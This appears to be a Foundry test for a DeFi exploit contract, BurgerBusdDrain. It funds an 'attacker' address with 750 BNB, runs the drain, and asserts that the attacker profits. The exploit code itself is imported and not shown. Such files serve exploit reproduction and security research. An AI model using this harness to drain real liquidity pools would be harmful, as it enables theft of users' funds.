// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerBusdDrain.sol";

contract BurgerBusdTest is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function test_drain_busd() public {
        address att = makeAddr("attacker");
        vm.deal(att, 1000 ether);
        vm.startPrank(att);

        uint256 bnbBefore = att.balance;

        BurgerBusdDrain e = new BurgerBusdDrain();
        // Send 750 BNB (700 buy + 20 seed + 1 burger + buffer)
        e.execute{value: 750 ether}();

        uint256 bnbAfter = att.balance;
        emit log_named_uint("BNB before", bnbBefore);
        emit log_named_uint("BNB after", bnbAfter);
        emit log_named_int("BNB delta", int256(bnbAfter) - int256(bnbBefore));

        assertTrue(bnbAfter > bnbBefore, "Must profit");
        vm.stopPrank();
    }
}
